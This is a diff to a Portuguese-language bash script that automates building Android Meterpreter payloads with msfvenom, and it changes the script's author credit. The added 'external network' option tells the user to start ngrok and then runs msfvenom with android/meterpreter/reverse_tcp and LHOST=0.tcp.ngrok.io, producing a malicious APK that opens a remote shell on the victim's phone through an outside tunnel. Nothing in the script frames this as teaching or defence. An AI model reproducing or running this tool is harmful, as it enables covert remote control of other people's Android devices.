@@ -1,8 +1,8 @@
 #!/bin/bash
 #historico
 # ------------------------------------------------------------------------
-# ESTA FERRAMENTA ELA PERMITE GERAR UM PAYLOAD PARA ANDROID AUTOMATIZADO *
-#                    CREATE BY : paulo                                   *
+# ESTA FERRAMENTA ELA PERMITE GERAR UM PAYLOAD AUTOMATIZADO              *
+#                    CREATE BY : killercrown                                   *
 #-------------------------------------------------------------------------
 # CORES
 CYAN="\033[01;36m"
@@ -11,16 +11,21 @@ PRETO="\033[30m"
 CLARO="\033[33m"
 
 #   CORES
-echo "---------------------------------------------------*"
-echo "[*]SEJA BEM VINDO AO GERADOR DE PAYLOAD[*]"
-echo "---------------------------------------------------*"
+
+figlet  "GERADOR"
+
+echo "*---------------------------------------------------*"
+echo "*[*]SEJA BEM VINDO AO GERADOR DE PAYLOAD[*]         *"
+echo "*---------------------------------------------------*"
 echo
 echo -e "${CYAN}*******************************************************************************"
-echo -e "${RED}** [1]- REDE INTERNA  **"   "${PRETO} ***ANDROID***  " ENGLISH
-echo -e "${RED}** [2]- REDE EXTERNA  **"  "${PRETO}  ***ANDROID*** " PORTUGUES
+echo -e "${RED}** [1]- REDE INTERNA  **"   "${PRETO} ***ANDROID***                            "
+echo -e "${RED}** [2]- REDE EXTERNA  **"  "${PRETO}  ***ANDROID***                           " 
 echo -e "${CYAN}*******************************************************************************"
 echo "[*]qual opcao deseja executar[*]?"
 read opcao
+echo "---------------------------------------------------"
+echo "---------------------------------------------------"
 #CRINADO PAYLOAD ANDROID EM REDE INTERNA 
 if [ "$opcao" -eq "1" ]
 then
@@ -43,6 +48,22 @@ echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
 echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
-sleep 3
+sleep 2
 clear
-cat metasploit
+cat metasploit.txt
+fi
+if [ "$opcao" -eq "2" ]
+then
+clear
+echo -e "${RED}[-]WARNING: ESTA OPCAO VAI FUCIONAR COM O SERVICO NGROK[-]"
+echo -e "${CLARO}[+]LIGUE O NGROK USANDO: NGROK TCP 4444(OU OUTRA PORTA)"
+echo -e "${CLARO}[+]INFORME A PORTA QUE O NGROK GEROU"
+read port
+echo "CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$port R > $app.apk
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
+echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+fi
+
